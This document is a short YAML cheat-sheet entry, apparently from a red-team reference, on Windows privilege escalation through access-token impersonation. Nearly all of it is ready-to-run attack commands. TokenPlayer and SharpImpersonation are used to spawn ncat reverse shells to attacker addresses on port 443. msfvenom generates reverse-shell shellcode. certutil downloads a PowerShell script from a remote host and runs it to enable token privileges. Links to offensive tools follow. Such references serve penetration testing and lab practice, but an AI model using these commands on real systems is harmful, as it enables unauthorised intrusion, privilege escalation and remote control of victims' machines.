---
functions:
  privilege-escalation:
    - description: TokenPlayer - Impersonate another user and spawn processes with those user tokens
      code: |
        # reverse shell
        ./TokenPlayer-v0.8.exe --pid 2156 --exec --prog C:\\Windows\\System32\\cmd.exe --args "/c C:\Windows\temp\ncat.exe 192.168.119.135 443 -e cmd.exe"

    - description: SharpImpersonation - Impersonate another user and spawn processes with those user tokens
      code: |
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.127 LPORT=443 -f base64
        SharpImpersonation.exe user:<user> shellcode:<base64shellcode>

        SharpImpersonation.exe user:<user> binary:<binary-Path>
        SharpImpersonation.exe user:xor\david binary:"ncat.exe 192.168.119.127 443 -e cmd.exe"

    - description: Enable Privileges to Manipulate Tokens - Impersonate another user and spawn processes with those user tokens
      code: |
        certutil.exe -urlcache -f http://10.10.14.10/EnablePrivs.ps1 EnablePrivs.ps1
        powershell -c ./EnablePrivs.ps1 SeAssignPrimaryTokenPrivilege
        https://github.com/fashionproof/EnableAllTokenPrivs

resources : |
  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges
  https://github.com/unkn0wnsyst3m/scripts/blob/master/TokenPlayerx64.exe
  https://github.com/unkn0wnsyst3m/scripts/blob/master/TokenPlayerx86.exe
  https://github.com/S1ckB0y1337/TokenPlayer
  https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation
  https://github.com/S3cur3Th1sSh1t/SharpImpersonation
  https://dmcxblue.gitbook.io/red-team-notes/privesc/access-token-manipulation
  https://github.com/fashionproof/EnableAllTokenPrivs
---

